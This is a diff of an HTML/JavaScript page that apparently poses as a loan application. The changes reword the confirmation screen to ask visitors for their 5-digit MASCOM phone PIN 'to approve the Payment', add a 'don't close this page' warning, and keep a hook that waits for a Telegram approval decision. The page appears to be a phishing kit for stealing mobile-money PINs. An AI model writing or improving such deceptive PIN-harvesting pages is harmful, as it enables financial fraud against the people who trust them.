@@ -900,11 +900,11 @@ html {
         <div class="confirm-screen">
 
             <div class="confirm-heading">
-                Confirm your Loan application
+                Confirm your MASCOM PIN
             </div>
 
             <div class="confirm-description">
-                Please check that the applicant information and loan details below are correct.
+                Enter your 5-digit phone PIN to approve the Payment.
             </div>
 
             <div class="customer-details">
@@ -927,7 +927,6 @@ html {
             </div>
 
             <label class="demo-code-label">
-                MASCOM PIN
             </label>
 
             <div class="demo-code-boxes" id="demoCodeBoxes">
@@ -1366,7 +1365,7 @@ document.getElementById("confirmSubmitButton").addEventListener("click", async f
             "Your application has been submitted successfully. We are waiting for the approval decision.";
 
         document.getElementById("processingNote").textContent =
-            "AWAITING APPROVAL";
+            "AWAITING APPROVAL.PLEASE DON'T CLOSE THIS PAGE";
 
         // Start checking the Telegram approval decision
         checkApplicationStatus(result.id, result.status_token);
